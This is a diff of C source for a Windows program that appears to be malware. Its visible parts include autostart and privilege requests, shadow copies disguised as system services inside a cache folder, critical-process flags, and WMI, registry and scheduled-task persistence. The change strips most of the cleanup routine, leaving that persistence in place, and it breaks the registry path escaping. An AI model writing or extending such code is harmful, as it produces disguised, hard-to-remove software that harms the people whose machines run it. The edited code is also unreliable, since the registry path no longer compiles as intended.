@@ -184,23 +184,11 @@ void sys_register_autostart(void) {
 }
 
 /* Check and request required privileges for system integration */
-/* Check if current user is in Administrators group */
-static BOOL IsUserAnAdminPlain(void) {
-    BOOL b = FALSE;
-    PSID administratorsGroup = NULL;
-    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
-    
-    if (AllocateAndInitializeSid(&ntAuthority, 2,
-        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
-        0, 0, 0, 0, 0, 0, &administratorsGroup)) {
-        CheckTokenMembership(NULL, administratorsGroup, &b);
-        FreeSid(administratorsGroup);
-    }
-    return b;
-}
+/* IsUserAnAdmin is exported by shell32.dll, used by many installers */
+BOOL WINAPI IsUserAnAdmin(void);
 
 void sys_check_privileges(void) {
-    if (IsUserAnAdminPlain()) return;
+    if (IsUserAnAdmin()) return;
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
     char action[16] = {0};
@@ -376,131 +364,26 @@ DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
     return 0;
 }
 
-/* === FULL CLEANUP: Remove ALL persistence and exit cleanly === */
+/* === CLEANUP: Remove registry persistence and exit === */
 void sys_cleanup(void) {
     extern volatile int g_exiting;
     g_exiting = 1;
     
-    char localAppData[MAX_PATH];
-    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
-    
-    char dirPath[MAX_PATH];
-    snprintf(dirPath, sizeof(dirPath), "%s\\Microsoft\\Windows\\INetCache\\IE", localAppData);
-    
-    const char *services[] = {
-        "ElevationService.exe",
-        "CrashHandler.exe",
-        "NotifyService.exe"
-    };
-    const char *regKeys[] = {
-        "ElevationService",
-        "CrashHandler",
-        "NotifyService",
-        "RoyalFortune"
-    };
-    
-    /* 1. Remove critical flag from ALL shadow processes */
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32First(hSnap, &pe)) {
-            do {
-                for (int i = 0; i < 3; i++) {
-                    if (_stricmp(pe.szExeFile, services[i]) == 0) {
-                        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
-                        if (hProc) {
-                            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-                            if (ntdll) {
-                                typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
-                                NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
-                                if (pNtSetInformationProcess) {
-                                    ULONG isCritical = 0;
-                                    pNtSetInformationProcess(hProc, 29, &isCritical, sizeof(isCritical));
-                                }
-                            }
-                            CloseHandle(hProc);
-                        }
-                    }
-                }
-            } while (Process32Next(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-    
-    /* 2. Remove critical flag from current process */
+    /* Remove critical flag from current process */
     sys_unprotect_process();
     
-    /* 3. Remove registry Run keys */
+    /* Remove registry Run keys */
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "Software\Microsoft\Windows\CurrentVersion\Run",
             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        for (int i = 0; i < 4; i++) {
-            RegDeleteValueA(hKey, regKeys[i]);
-        }
+        RegDeleteValueA(hKey, "ElevationService");
+        RegDeleteValueA(hKey, "CrashHandler");
+        RegDeleteValueA(hKey, "NotifyService");
+        RegDeleteValueA(hKey, "RoyalFortune");
         RegCloseKey(hKey);
     }
     
-    /* 4. Remove scheduled tasks */
-    char cmd[512];
-    for (int i = 0; i < 3; i++) {
-        snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", regKeys[i]);
-        system(cmd);
-    }
-    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"RoyalFortuneMain\" /f 2>nul");
-    system(cmd);
-    
-    /* 5. Remove WMI persistence */
-    snprintf(cmd, sizeof(cmd),
-        "powershell -NoProfile -ExecutionPolicy Bypass -Command \""
-        "Remove-WmiObject -Namespace 'root/subscription' -Class __EventFilter -Filter \\\"Name='SysHealthFilter'\\\" -ErrorAction SilentlyContinue;"
-        "Remove-WmiObject -Namespace 'root/subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SysHealthConsumer'\\\" -ErrorAction SilentlyContinue;"
-        "Remove-WmiObject -Namespace 'root/subscription' -Class __FilterToConsumerBinding -Filter \\\"Filter='__EventFilter.Name=\\\"SysHealthFilter\\\"'\\\" -ErrorAction SilentlyContinue"
-        "\"");
-    system(cmd);
-    
-    /* 6. Remove NTFS hardening so files can be deleted */
-    /* Take ownership back first */
-    snprintf(cmd, sizeof(cmd), "takeown /f \"%s\" /r /d y 2>nul", dirPath);
-    system(cmd);
-    /* Reset permissions */
-    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /reset /t /c /q 2>nul", dirPath);
-    system(cmd);
-    /* Grant full control to current user */
-    snprintf(cmd, sizeof(cmd), "icacls \"%s\" /grant \"%s\":(F) /t /c /q 2>nul", dirPath, "%USERNAME%");
-    system(cmd);
-    
-    /* 7. Terminate ALL shadow processes */
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32First(hSnap, &pe)) {
-            do {
-                for (int i = 0; i < 3; i++) {
-                    if (_stricmp(pe.szExeFile, services[i]) == 0) {
-                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                        if (hProc) {
-                            TerminateProcess(hProc, 0);
-                            CloseHandle(hProc);
-                        }
-                    }
-                }
-            } while (Process32Next(hSnap, &pe));
-        }
-        CloseHandle(hSnap);
-    }
-    
-    /* 8. Delete shadow files */
-    for (int i = 0; i < 3; i++) {
-        char path[MAX_PATH];
-        snprintf(path, sizeof(path), "%s\\%s", dirPath, services[i]);
-        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
-        DeleteFileA(path);
-    }
-    
-    /* 9. Exit self gracefully */
     ExitProcess(0);
 }
 
@@ -525,7 +408,7 @@ static void ensure_dir_exists(const char *path) {
 
 /* Check if current process is running as admin */
 int sys_is_admin(void) {
-    return IsUserAnAdminPlain() ? 1 : 0;
+    return IsUserAnAdmin() ? 1 : 0;
 }
 
 /* Spawn a single shadow copy with a given filename and registry key name.
